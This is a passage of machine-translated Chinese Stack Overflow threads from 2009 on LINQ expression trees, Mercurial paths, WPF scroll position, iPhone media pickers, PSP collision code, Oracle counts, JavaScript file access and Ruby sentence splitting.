        MemberExpression memberExp;
        switch (pkProp.MemberType)
        {
            case MemberTypes.Field: memberExp = Expression.Field(param, (FieldInfo)pkProp); break;
            case MemberTypes.Property: memberExp = Expression.Property(param, (PropertyInfo)pkProp); break;
            default: throw new NotSupportedException("Invalid primary key member: " + pkProp.Name);
        }
        Expression body = Expression.Equal(
        memberExp, Expression.Constant(key, typeof(TKey)));
        var predicate = Expression.Lambda<Func<TEntity, bool>>(body, param);
        return table.Single(predicate);
    } 
```

这是一个包含我需要的东西的 DataContext 扩展方法。但是，它需要我没有可用的通用参数 - 属性不允许通用子类，所以....

我已经破解了代码到这一点：

```
 public override bool IsValid(object value)
        SomeDataContext context = SomeDataContext.GetNewDataContext();
        var table = context.GetTable(_EntityType);
        var codeProp = (from member in context.Mapping.GetMetaType(_EntityType).DataMembers
                        where member.Name == _PropertyName
                        select member.Member).Single();
        ParameterExpression param = Expression.Parameter(_EntityType, "x");
        MemberExpression memberExp = Expression.Property(param, (PropertyInfo)codeProp); 
        Expression body = Expression.Equal(memberExp, Expression.Constant(value, typeof(char)));
        Type lambdaType = typeof(Func<,>).MakeGenericType(_EntityType, typeof(bool)); 
        var predicate = Expression.Lambda(lambdaType, body, param); 
        object code = table.FirstOrDefault(predicate);
        if (code != null)
        {
            return false;
        }
        return true;
    } 
```

这条线很糟糕：

```
 object code = table.FirstOrDefault(predicate); 
```

正如我[在这里](https://stackoverflow.com/questions/858987/trying-to-get-generic-when-generic-is-not-available)所说的那样没有帮助的答案。

*   `var enumerator = ((IEnumerable)table).GetEnumerator();object code = enumerator.MoveNext() ? enumerator.Value : null;`
    在我尝试构建表达式树时没有用。
*   `IEnumerable<object> tableGeneric = ((IEnumerable)table).OfType<object>();`
    我尝试时遇到问题：
    `object code = tableGeneric.FirstOrDefault(predicate);`

所以，我很困惑。有什么想法吗？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-05-29T08:21:52.507

您可能正在寻找的最终结果是，据我所知，您确实想要一种方法，例如：

```
public bool IsValid<TEntity>()
{
    // validation logic goes here
} 
```

这样您就可以执行所需的检查，但您需要在只有运行时类型可用的方法中实现它：

```
public bool IsValid(Type entityType)
{
    // ???
} 
```

如果是这种情况，那么您使用所需的逻辑实现第一个代码块，然后将第二种方法实现为：

```
public bool IsValidWrapper(Type entityType)
{
    // You may want to be stricter than this, but the essence is to
    // get a handle to the generic method first...
    MethodInfo genMethod = GetType().GetMethod("IsValid");

    // Bind it to the type you want to operate on...
    MethodInfo method = genMethod.MakeGenericMethod(entityType);

    // And invoke it...
    return (bool) method.Invoke(this, null);
} 
```

它不会赢得任何选美比赛或表演冠军，但它会为您提供所需的东西。请注意，如果性能是一个问题，您可以`Type`使用签名保持对委托的查找，`bool delegate()`这样您就不必多次对给定类型使用慢反射来执行类型绑定。

# mercurial - 更改 Mercurial“默认”父 URL

> ID：860761
> 
> 赞同：125
> 
> 时间：2009-05-13T22:31:30.830
> 
> 标签：mercurial

假设我有一个 Mercurial 存储库，并且我从默认父 URL（我克隆它的源）中提取。

现在我想更改默认的父 URL（主机名更改，或者它被复制到另一台机器等）。有没有办法做到这一点，还是我必须从新的 URL 重新克隆？

* * *

## 回答 #1

> 赞同：150
> 
> 时间：2009-05-16T10:29:11.413

您甚至可以在 .hg/hgrc 文件的 [paths] 部分添加多个条目。

```
[paths]
default = /repo_store/hg/project1
sandbox = /repo_store/hg/project1_experimental 
```

然后可以在 mercurial 命令中指定其别名。不需要指定默认仓库，但其他必须像，

```
hg in            # check incoming changes from default repo
hg in default    # check incoming changes from default repo
hg in sandbox    # check incoming changes from sandbox repo
hg pull sandbox  # pull changes from sandbox repo 
```

* * *

## 回答 #2

> 赞同：54
> 
> 时间：2009-05-13T22:34:06.613

我刚刚找到了我自己问题的答案。编辑`.hg/hgrc`存储库中的文件，更改该部分`default`下的设置`[paths]`。简单的！

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-11-03T13:02:56.660

### 为 Mercurial 推送和拉取设置默认 BitBucket 存储库的示例。

通常我们可以使用

```
$ hg push https://bitbucket.org/username/com.example.app 
```

但是如果我们想在`$ hg push`没有存储库 URL 的情况下使用，我们必须将 URL 添加到文件 $REPO/.hg/hgrc 中。我们添加以下内容：

```
[paths]
default = https://bitbucket.org/username/com.example.app 
```

关于您的问题，只需将`default`路径设置为新 URL。

# wpf - 集合更改时保留绑定的 WPF ListBox 的滚动位置

> ID：860764
> 
> 赞同：11
> 
> 时间：2009-05-13T22:33:09.377
> 
> 标签：wpf, listbox

我有一个`ListBox`绑定到`ObservableCollection`. 当将事物添加到集合中时，`ListBox`滚动位置会根据添加条目的大小而变化。我希望能够保留滚动位置，以便即使将内容添加到列表中，当前视图中的项目也不会移动。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-03-11T09:50:12.720

我遇到了同样的问题和另一个限制：用户不选择项目，而只是滚动。这就是为什么该`ScrollIntoView()`方法是无用的。这是我的解决方案。

首先，我创建`ScrollPreserver`了从 DependencyObject 派生的类，并附加`PreserveScroll`了 bool 类型的依赖属性：

```
public class ScrollPreserver : DependencyObject
{
    public static readonly DependencyProperty PreserveScrollProperty =
        DependencyProperty.RegisterAttached("PreserveScroll", 
            typeof(bool),
            typeof(ScrollPreserver), 
            new PropertyMetadata(new PropertyChangedCallback(OnScrollGroupChanged)));

    public static bool GetPreserveScroll(DependencyObject invoker)
    {
        return (bool)invoker.GetValue(PreserveScrollProperty);
    }

    public static void SetPreserveScroll(DependencyObject invoker, bool value)
    {
        invoker.SetValue(PreserveScrollProperty, value);
    }

    ...
} 
```

属性更改回调假定属性由 ScrollViewer 设置。回调方法将此 ScrollViewer 添加到私有 Dictionary 并向其添加 ScrollChanged 事件处理程序：

```
private static Dictionary<ScrollViewer, bool> scrollViewers_States = 
    new Dictionary<ScrollViewer, bool>();

private static void OnScrollGroupChanged(DependencyObject d, DependencyPropertyChangedEventArgs e)
{
    ScrollViewer scrollViewer = d as ScrollViewer;
    if (scrollViewer != null && (bool)e.NewValue == true)
    {
        if (!scrollViewers_States.ContainsKey(scrollViewer))
        {
            scrollViewer.ScrollChanged += new    ScrollChangedEventHandler(scrollViewer_ScrollChanged);
            scrollViewers_States.Add(scrollViewer, false);
        }
    }
} 
```

该字典将保存对应用程序中使用此类的所有 ScrollViewer 的引用。在我的情况下，项目被添加到集合的开头。问题是视口位置不会改变。位置为 0 时可以：视口中的第一个元素将始终是第一项。但是当视口中的第一个元素有另一个索引而不是 0 并且添加了新项目时 - 该元素的索引会增加，因此它会向下滚动。所以 bool 值表示 ScrollViewer 的垂直偏移量是否不为 0。如果为 0，则无需执行任何操作，如果不为 0，则需要保留其相对于视口中项目的位置：

```
static void scrollViewer_ScrollChanged(object sender, ScrollChangedEventArgs e)
{
    if (scrollViewers_States[sender as ScrollViewer])
        (sender as ScrollViewer).ScrollToVerticalOffset(e.VerticalOffset + e.ExtentHeightChange);

    scrollViewers_States[sender as ScrollViewer] = e.VerticalOffset != 0;
} 
```

这里使用 ExtentHeightChange 来表示添加项的数量。在我的情况下，项目只在集合的开头添加，所以我需要做的就是将 ScrollViewer 的 VerticalOffset 增加这个值。最后一件事：使用。这是列表框的示例：

```
<Listbox ...> 
    <ListBox.Resourses>
        <Style TargetType="ScrollViewer">
            <Setter Property="local:ScrollPreserver.PreserveScroll" Value="True" />
        </Style>
    </ListBox.Resourses>
</ListBox> 
```

达达！很好用:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2010-09-17T12:12:26.890

首先通过 ListBox.SelectedIndex 找到当前位置，然后使用 ListBox.ScrollIntoView(/* Current Index */)。即使在列表中添加了新项目，您当前的位置和视图也将相同。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-15T17:52:44.460

我不确定是否有替代方案，但我对此表示怀疑。

如有疑问，请使用手动装订？:-} 说真的，默认绑定行为将是-嗯-默认，所以如果您需要特殊行为，手动绑定是更好的选择。使用手动装订，您可以保存滚动位置并在添加项目后将其重置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-05-16T11:55:50.440

创建一个集合视图。尝试这个：

```
 private ObservableCollection<int> m_Values;
    private CollectionView m_View;

    private void Bind()
    {
        m_Values = new ObservableCollection<int>();
        m_View = new CollectionView(m_Values);
        MyListBox.ItemsSource = m_View;
    }

    private void MyListBox_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        Debug.WriteLine(m_View.CurrentItem);
        Debug.WriteLine(m_View.CurrentPosition);
    } 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-05-17T03:13:26.383

你控制什么时候添加东西？我的意思是你有一个或两个数据被改变的定义点吗？如果是这样，一个简单的解决方案（可能并不优雅）就是有一个本地 int 变量来保存当前的 ListBox.SelectedIndex。就在数据更改之前，将 selectedIndex 保存到该变量中，并在添加数据后，将 listBox 的 SelectedIndex 设置为该变量的值。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-07-04T06:38:01.653

我遇到了同样的问题，这就是我所做的： 1\. 在列表框被引导时找到它的滚动查看器并添加一个滚动更改事件。

```
var scrollViewer = FindScrollViewer(ListBoxOrders);
if (scrollViewer != null)
{
    scrollViewer.ScrollChanged += scrollViewer_ScrollChanged;
} 
```

这是查找滚动查看器的功能：

```
 private ScrollViewer FindScrollViewer(DependencyObject d)
{
    if (d is ScrollViewer)
        return d as ScrollViewer;

    for (int i = 0; i < VisualTreeHelper.GetChildrenCount(d); i++)
    {
        var sw = FindScrollViewer(VisualTreeHelper.GetChild(d, i));
        if (sw != null) return sw;
    }
    return null;
} 
```

2.  在滚动更改时，存储垂直偏移量

    `private double _verticalOffset; private void scrollViewer_ScrollChanged(object sender, ScrollChangedEventArgs e) { var sv = (ScrollViewer)sender; _verticalOffset = sv.VerticalOffset; }`

3.  刷新后，滚动到上一个位置

    `scrollViewer?.ScrollToVerticalOffset(_verticalOffset);`

# iphone - 我似乎无法让新的 iPhone 媒体播放器框架工作

> ID：860778
> 
> 赞同：0
> 
> 时间：2009-05-13T22:37:54.953
> 
> 标签：iphone, objective-c, cocoa-touch

我正在使用 3.0 SDK，所以我不能使用细节，但我希望任何使用它的人都可以理解。

我一直在尝试加载一个视图，该视图允许您从特定的项目列表中进行选择......但我无法让它工作这是我正在使用的代码，它是通用的：

```
M**********Controller *newpicker = [[M**********Controller alloc] init]; 
```

我试过使用上述的变体，但我似乎无法让它工作。我不确定我是否在代码中的正确位置调用它，或者这是否是正确的方法。文档在[这里](http://developer.apple.com/iphone/prerelease/library/documentation/MediaPlayer/Reference/MPMediaPickerController_ClassReference/Reference/Reference.html)（只有注册开发者可以查看）。在我看来，这与使用 UIAlertView 类似，但它似乎不像那样工作。这可能太晦涩难懂，但如果有人可以提供帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T23:44:52.800

它是一个 UIViewController 子类，因此您可以像显示任何其他 UIViewController 一样显示它，也就是说，您有几个选项：

如果您在导航层次结构中，您可以这样做：

```
[self.navigationController pushViewController: newpicker animated: YES]; 
```

或者可能是这样的：

```
[self.navigationController presentModalViewController: newpicker animated: YES]; 
```

如果当前控制器不在导航控制器中，您只需将新控制器的视图放在另一个控制器中；用于`newpicker.view`为此目的访问它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-05-14T05:03:23.147

添加到吉姆，

所有 UIViewControllers 也有一个 view 属性。在屏幕上的任何 viewController 中，您都可以简单地：

```
[self.view addSubview:newPicker.view]; 
```

# c++ - C++ 中用于 psp 的 OSlib 的冲突问题

> ID：860779
> 
> 赞同：0
> 
> 时间：2009-05-13T22:38:06.700
> 
> 标签：c++, collision, playstation-portable

我将 oslib 与 pspsdk 工具链一起使用，由于某种原因，这并没有按照我认为的方式工作

```
float spritewidth  = sprite->stretchX;
float spriteheight = sprite->stretchY;
float bushwidth  = bush->stretchX;
float bushheight = bush->stretchY;

//Basic border collision
if (sprite->x <= 0)
 sprite->x = 0;
if (sprite->y <= 0)
 sprite->y = 0;
if (sprite->x >= 455)
 sprite->x = 455;
if (sprite->y >= 237)
 sprite->y = 237;

 //Bush
if ( (sprite->x + spritewidth > bush->x) && 
    (sprite->x < bush->x + bushwidth) && 
    (sprite->y + spriteheight > bush->y) && 
    (sprite->y < bush->y + bushheight) ) 
{
  bushcol = 1;               
}
else
{
  bushcol = 0;      
}

 if (osl_keys->held.down)
 {
   if (bushcol == 0)
   {
     sprite->y += 4;
     sprite_position = DOWN;
     SpriteAnimate();
   }
   else
   { 
     sprite->y -= 6;
     bushcol = 0;
   }
 }

 if (osl_keys->held.up)    
 {
   if (bushcol == 0)
   {
     sprite->y -= 4;
     sprite_position = UP;
     SpriteAnimate();
   }
   else
   { 
     sprite->y += 6;
     bushcol = 0;
   }
 }

 if (osl_keys->held.right)
 {
   if (bushcol == 0)
   {
     sprite->x += 4;
     sprite_position = RIGHT;
     SpriteAnimate();
   }
   else
   { 
     sprite->x -= 6;
     bushcol = 0;
   }
 }

 if (osl_keys->held.left)
 {
   if (bushcol == 0)
   {
     sprite->x -= 4;
     sprite_position = LEFT;
     SpriteAnimate();
   }
   else
   { 
     sprite->x += 6;
     bushcol = 0;
   }
 } 
```

当我试图离开时，精灵开始向与灌木相反的方向移动，但最终还是自由落下

任何更好的碰撞方法或建议

我什至为每个按钮都试过这个，但仍然没有运气

```
if (osl_keys->held.down)
{
  if ( (sprite->x + spritewidth > bush->x) &&
       (sprite->x < bush->x + bushwidth) && 
       (sprite->y + spriteheight > bush->y) &&
       (sprite->y < bush->y + bushheight) ) 
  {
    sprite->y -= 4; 
  }
  else
  {
    sprite->y += 2;
    sprite_position = DOWN;
    SpriteAnimate();
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T23:32:50.543

您可以做的一件事是，当角色撞到灌木丛时，您可以改变他的位置，而不是让角色“向后移动”。

我的意思是这样的：（仅用于示例）。

```
 if (osl_keys->held.up)    
 {
   if (bushcol == 0)
   {
     sprite->y -= 4;
     sprite_position = UP;
     SpriteAnimate();
   }
   else
   { 
     sprite->y = bush->y + 2;
     bushcol = 0;
   }
 } 
```

这样，每当精灵碰撞时，它只是设置位置而不是让它向后移动。

还有其他方法可以进行碰撞检测，但我现在太累了，无法立即做出一个智能的、可读性差得多的答案……在谷歌上搜索会发现很多结果。

# oracle - 在 Oracle 的一个表中显示多个总计

> ID：860782
> 
> 赞同：0
> 
> 时间：2009-05-13T22:39:25.123
> 
> 标签：oracle

我正在尝试使用以下查询计算名为 DRAWING 的表中的总行数： Select field, platform, count(doc_id) as total from drawing group by field, platform;

但我还需要显示每个平台的附件/非附件总数

SQL：

从绘图中选择字段、平台、计数（doc_id），其中 file_bin 不为空，按字段、平台分组；

从绘图中选择 field,platform,count(doc_id) as non_attached，其中 file_bin 为空，按字段、平台分组；

有没有办法将 3 个值组合成一个视图？例如字段、平台、总计、附加、非附加

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-05-13T22:48:00.427

尝试这个：

```
select 
  field, 
  platform, 
  count(doc_id) as total,
  sum(iif(file_bin is null, 1, 0)) as attached,
  sum(iif(file_bin is not null, 1, 0)) as non_attached
from drawing 
where doc_id is not null 
group by field, platform 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-14T02:17:17.743

感谢 Douglas Tosi 的建议，我设法改用了 case 方法。

选择字段，平台，计数（doc_id）作为总数，Sum（CASE WHEN file_bin 为空 THEN 1 WHEN file_bin 不为空 THEN 0 END）作为附件，Sum（CASE WHEN file_bin 为空 THEN 0 WHEN file_bin 不为空 THEN 1 END ) 作为非附加的绘图，其中 doc_id 不为空，按字段、平台分组

完美的！！

再次感谢道格拉斯

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-05-14T07:09:53.813

我会使用解码而不是大小写，不知道什么表现更好（未经测试）：

```
select field
,      platform
,      count(doc_id) as total
,      sum(decode(file_bin,null,1,0)) attached 
,      sum(decode(file_bin,null,0,1)) non_attached
from   drawing 
where  doc_id is not null 
group by field,platform 
```

# javascript - javascript、flash 和 MAPublisher 层切换问题

> ID：860785
> 
> 赞同：0
> 
> 时间：2009-05-13T22:39:48.973
> 
> 标签：javascript, flash, adobe-illustrator, togglebutton

问候。

我正在使用 Avenza Mapublisher（Adobe Illustrator 的扩展）来创建[交互式地图](http://jb.humboldtgeospatial.com/Export/MAPublisherSWF.html)。

导出地图时，它会创建一系列 Flash swf 文件、一个 html 文件和一些 javascript 代码。上面的链接显示了非格式化版本。如您所见，地图加载非常缓慢，因为默认情况下，所有图层在加载时都会打开。我已经尝试了所有方法，但无法弄清楚如何控制加载地图时显示哪些图层。我真正想要的只是学校、城镇和一个在加载时处于活动状态的道路层，其余的则被关闭。理想情况下，我希望剩余的农药层位于下拉菜单中，因此只能选择一个。

我尝试将选中的 =“真”设置为“假”，完全消除了选中，复选框出现*未*选中，但图层仍处于活动状态。我在想必须将某些东西写入我无法控制的 swf 文件中。有没有人使用过这个程序。如果您有兴趣，可以在线免费试用 2 周。

所以html文件调用

```
<script src="layerCheckboxes.js" language="javaScript"></script> 
```

这个文件基本上是一个包含所有选择选项的变量。

```
var checkboxes = ' \
<input type="checkbox" checked="true" value="Tulare Schools" onClick="swfLayerToggle(value, checked);" />Tulare Schools \
<input type="checkbox" checked="true" value="Towns" onClick="swfLayerToggle(value, checked);" />Towns \
<input type="checkbox" checked="true" value="Major Roads" onClick="swfLayerToggle(value, checked);" />Major Roads \
<input type="checkbox" checked="true" value="County Roads" onClick="swfLayerToggle(value, checked);" />County Roads \
<input type="checkbox" checked="true" value="1_3 Dichloropropene" onClick="swfLayerToggle(value, checked);" />1_3 Dichloropropene \
<input type="checkbox" checked="true" value="Aluminum Phosphide" onClick="swfLayerToggle(value, checked);" />Aluminum Phosphide \
<input type="checkbox" checked="true" value="Chloropicrin" onClick="swfLayerToggle(value, checked);" />Chloropicrin \
<input type="checkbox" checked="true" value="Chlorpyrifos" onClick="swfLayerToggle(value, checked);" />Chlorpyrifos \
<input type="checkbox" checked="true" value="Diazinon" onClick="swfLayerToggle(value, checked);" />Diazinon \
<input type="checkbox" checked="true" value="Fumigants" onClick="swfLayerToggle(value, checked);" />Fumigants \
<input type="checkbox" checked="true" value="Metam Sodium" onClick="swfLayerToggle(value, checked);" />Metam Sodium \
<input type="checkbox" checked="true" value="Methyl Bromide" onClick="swfLayerToggle(value, checked);" />Methyl Bromide \
<input type="checkbox" checked="true" value="Sodium Tetrathiocarbonate" onClick="swfLayerToggle(value, checked);" />Sodium Tetrathiocarbonate \
<input type="checkbox" checked="true" value="Acres Treated" onClick="swfLayerToggle(value, checked);" />Acres Treated \
<input type="checkbox" checked="true" value="Application Rate" onClick="swfLayerToggle(value, checked);" />Application Rate \
<input type="checkbox" checked="true" value="Pesticide Use" onClick="swfLayerToggle(value, checked);" />Pesticide Use \
<input type="checkbox" checked="true" value="Agriculture Use" onClick="swfLayerToggle(value, checked);" />Agriculture Use'

document.write('<form>' + checkboxes + '</form>'); 
```

并且函数 swfLayerToggle() 在一个名为 checkboxFuntions.js 的文件中

```
function getMyApp(appName) {                
    if (navigator.appName.indexOf ("Microsoft") !=-1) { 
        return window[appName];             
    } else {                        
        return document[appName];           
    }                           
}                           

function swfLayerToggle(layer, isOn) {          
    getMyApp("MAPublisherSWF").swfLayerToggle(layer, isOn); 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-07-29T15:05:39.713

我为阿文扎工作。

不幸的是，MAPublisher 8.1 无法实现您想要做的事情，但它已添加到现在可用的 8.2 版中。只需更改 Web 地图导出对话框中您不想在地图加载时显示的图层的“初始可见”设置。

# javascript - Javascript可以访问服务器上的文件吗？

> ID：860792
> 
> 赞同：-1
> 
> 时间：2009-05-13T22:44:41.743
> 
> 标签：javascript, filesystems

有人问[如何从 JavaScript 连接到 SQL Server 数据库？](https://stackoverflow.com/questions/857670/how-to-connect-to-sql-server-database-from-javascript/857693#857693)我发现这是可能的，

所以有人可以让我吃惊并对我的问题说“是”？

JavaScript 可以访问服务器上的文件吗？

**我知道这是不可能的，但我在 SQL 数据库问题上说不，但我发现有人回答是！**

注意：这个问题是在 NodeJS 发布之前，或者至少在我知道有一个叫做 NodeJS 的东西之前。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T22:51:58.690

一般来说，没有机会。

在非常特殊的情况下是可能的。该页面必须是一个超文本应用程序 (.hta) 才能完全访问文件系统，并且服务器必须与客户端位于同一本地网络中。

下面是一个使用`FileSystemObject`对象从服务器读取文件的 .hta 页面示例：

```
<html>
<head>
<title>File</title>
</head>
<body>
<script>

var f = new ActiveXObject("Scripting.FileSystemObject");
var name = '\\\\TheServer\\Users\\Public\\Downloads\\test.txt';
if (f.FileExists(name)) {
    var stream = f.OpenTextFile(name, 1);
    var text = stream.ReadAll();
    stream.Close();
    alert(text);
} else {
    alert('File could not be accessed.');
}

</script>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-05-14T08:23:48.330

您提到的问题不使用 JavaScript 来访问 SQL 数据库。

它使用 JavaScript 访问 ActiveX 控件（需要 Internet Explorer + Widows + 增强的安全权限）。

您可以以相同的方式访问文件系统 - 给定合适的 ActiveX 控件。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-05-13T22:59:40.363

绝对地。如果您在服务器端运行 javascript。:) 从浏览器？不，你也不想，我想。有很多技巧可以使用 ajax、flash 或其他任何东西来获取浏览器 DOM 中的信息，但您需要设置脚本、Web 服务、端点或其他使数据在服务器上可用的方法，然后从那。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-05-13T22:45:40.633

SQL From Javascript 在客户端？你开玩笑的对吧？

至于服务器上的文件……欢迎上网。也许您的问题需要进一步澄清。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-05-13T22:47:48.073

您可以使用 AJAX 与服务器对话，但不能直接访问文件、数据库等资源。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-05-13T22:49:52.517

它可以但不能在传统的打开文件、读取文件和关闭文件范式中。

您可以在服务器上创建一个 Web 服务，该服务将使用 ajax 从文件中返回数据，例如文本文件的内容。但是，文件的读取/解析将是 Web 服务器的责任，然后它必须将有用的数据传递回客户端。

尽管如此，您将无法更好地控制文件。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-05-13T22:53:59.153

通过服务器端脚本打开服务器的文件系统可能会带来更多值得的复杂性。实际上，我以前曾有人问过我这个问题，而且每次那个人根本不知道更好。他们对 Web 开发的了解不足以知道如何做这样的事情，他们只是试图将他们在桌面应用程序编程方面的经验应用于 Web 开发。可能有更好的方法来完成你想做的任何事情。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-05-14T10:47:26.567

理论上，您可以在 JavaScript 中做任何事情，因为您可以使用 COM 对象（至少在 Windows 上），而 COM 对象又可以在该机器上做几乎任何事情。实际上，如果这个 JavaScript 是从一个网页执行的，你会遇到无数的安全/权限/防火墙问题，所以真的不值得去说服。

# visual-studio - 获得 Visual Studio 2008 标准版许可证最便宜的方法是什么？

> ID：860795
> 
> 赞同：4
> 
> 时间：2009-05-13T22:45:23.210
> 
> 标签：visual-studio, visual-studio-2008

我知道我可以以 299.00 美元的价格购买它，但我从 Express 版本升级的主要原因是我希望能够使用 ReSharper，这是一笔额外的费用。有什么方法可以以低于现成的价格获得 VS 副本？我可以加入的任何特殊计划，或者是否有特殊的“开发者”版本:)（有点多余，我知道）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-05-13T23:13:28.983

微软目前有时间限制行动，即使是从 Express 版甚至是 Eclipse 等免费工具升级，也可以以升级价格（标准版 199 美元）购买 Visual Studio 2008（标准版和专业版）。请参阅[本页](http://store.microsoft.com/microsoft/Visual-Studio-2008-Standard-Edition-Upgrade/product/99E69042)上的“购买前”部分。但是，这可能仅限于某些地区。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-05-13T22:50:15.807

[如果您加入他们的授权](http://www.empowerforisv.com/)计划或免费使用[bizspark](http://www.microsoft.com/bizspark/)，您可以获得所有 MS 开发工具和许多其他好东西

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-05-13T22:54:53.397

[https://downloads.channel8.msdn.com/](https://downloads.channel8.msdn.com/) - 为学生提供免费的 MS 开发资料。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-05-13T22:58:10.240

您的社区中有 .NET 用户组吗？如果有，请联系他们。他们通常可以打折买东西。MS 用户组支持服务为用户组提供了大量的免费赠品，也许他们有你可以拥有的副本。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-05-13T22:48:41.660

不知道你是否有资格，但如果你是学生，我相信你可以免费获得它。如果你不是，让你的公司小马起来:)

编辑：这是面向学生的[DreamSpark](https://www.dreamspark.com/default.aspx)网站。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-05-13T23:04:48.200

只是有些东西在这里......

为什么不也看看 SharpDevelop，它非常好，它是免费的，你可以访问它的源代码。我不确定 ReSharper 是否支持它，可能不支持，但那里已经有一些很好的重构内容，当然你可以自己扩展它。IMO 至少值得一看。

[http://www.icsharpcode.net/OpenSource/SD/Features.aspx](http://www.icsharpcode.net/OpenSource/SD/Features.aspx)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-05-13T22:52:20.827

我的大学订阅了 CompSci 专业的 MSDNAA，它为我提供了市场上几乎所有 Microsoft 产品的学生许可证……但它并没有真正做广告。如果你的学校也这样做，我不确定你会如何寻找。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-05-13T23:29:08.817

参加了数十个微软会议中的任何一个。自己摸索着给你免费的东西——包括Visual Studio。

# ruby - 如何将一段文本解析成句子？（最好在 Ruby 中）

> ID：860809
> 
> 赞同：22
> 
> 时间：2009-05-13T22:49:48.473
> 
> 标签：ruby, text, parsing, split, nlp

考虑到 Mr. and Dr. 和 USA 等案例，您如何将段落或大量文本分解成句子（最好使用 Ruby）？（假设您只是将句子放入数组数组中）

更新：我想到的一种可能的解决方案是使用词性标注器（POST）和分类器来确定句子的结尾：

从琼斯先生那里得到数据，当他走到意大利避暑别墅的阳台上时，他感觉到温暖的阳光照在他的脸上。他很高兴能活着。

分类器 Mr./PERSON Jones/PERSON 感觉/O 温暖/O 太阳/O 上/O 他/O 脸/O 作为/O 他/O 踩/O 出/O 上/O/O 阳台/O的/O 他的/O 夏天/O 家/O 在/O 意大利/LOCATION ./O 他/O 是/O 快乐/O 到/O 是/O 活着/O./O

POST Mr./NNP Jones/NNP 毡/VBD/DT 暖/JJ sun/NN on/IN his/PRP$ face/NN as/IN he/PRP step/VBD out/RP on/IN/DT 阳台/ NN 的/IN 他的/PRP$ 夏天/NN 家/NN 在/IN 意大利。/NNP 他/PRP 是/VBD 高兴/JJ 到/TO 是/VB 活着。/IN

我们可以假设，由于意大利是一个地点，句号是句子的有效结尾吗？自从以“先生”结束 没有其他词性，我们可以假设这不是一个有效的句末期吗？这是对我的问题的最佳答案吗？

想法？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2009-05-14T14:35:57.360

尝试查看[Stanford Parser 周围的 Ruby 包装器](https://rubygems.org/gems/stanfordparser)。它有一个 getSentencesFromString() 函数。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-05-13T23:13:17.220

只是说清楚，没有简单的解决方案。这是 NLP 研究的主题，如[Google 快速搜索](http://www.google.de/search?q=nlp+sentence+detection)所示。

但是，似乎有一些开源项目处理支持句子检测的 NLP，我发现了以下基于 Java 的工具集：

> **[开放式自然语言处理](http://opennlp.sourceforge.net/)**

[附加评论：决定句子从哪里开始和结束的问题在自然语言处理](http://en.wikipedia.org/wiki/Natural_language_processing)中也称为[句子边界消歧](http://en.wikipedia.org/wiki/Sentence_boundary_disambiguation)（SBD）。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2010-05-06T16:03:03.373

看起来这颗红宝石可以解决问题。

[https://github.com/zencephalon/Tactful_Tokenizer](https://github.com/zencephalon/Tactful_Tokenizer)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-05-25T21:22:07.690

看一下[NLTK](http://www.nltk.org) (Natural Language Tool Kit) 中的 Python 分句器：

[Punkt 句子分词器](http://code.google.com/p/nltk/source/browse/trunk/nltk/nltk/tokenize/punkt.py)

它基于以下论文：

Kiss、Tibor 和 Strunk，Jan (2006)：[无监督多语言句子边界检测](http://www.linguistics.ruhr-uni-bochum.de/~strunk/ks2005FINAL.pdf)。 *计算语言学*32：485-525。

论文中的方法非常有趣。他们将句子分裂的问题简化为确定一个单词与以下标点符号的关联程度的问题。缩写词后句点的重载是造成大多数模棱两可句点的原因，因此，如果您能识别缩写词，则很有可能识别句子边界。

我已经非正式地测试了这个工具，它似乎为各种（人类）语言提供了良好的结果。

将它移植到 Ruby 中并非易事，但它可能会给您一些想法。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-05-13T23:13:44.567

如果你真的很想把它做好，这是一个难题。您会发现 NLP 解析器包可能提供此功能。如果您想要更快的东西，您最终需要使用经过训练的令牌窗口的概率函数来复制其中的一些功能（您可能希望将换行视为令牌，因为如果这是一段的结尾）。

编辑：如果您可以使用 Java，我推荐斯坦福解析器。我不推荐其他语言，但我很想知道还有什么是开源的。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-05-13T23:59:29.983

不幸的是，我不是一个 ruby​​ 人，但也许 perl 中的一个例子会让你朝着正确的方向前进。使用不匹配的look behind 结尾标点符号，然后一些特殊情况在 not behind 后跟任意数量的空格，然后是大写字母。我敢肯定这并不完美，但我希望它能为您指明正确的方向。不知道你怎么知道美国是否真的在句子的结尾......

```
#!/usr/bin/perl

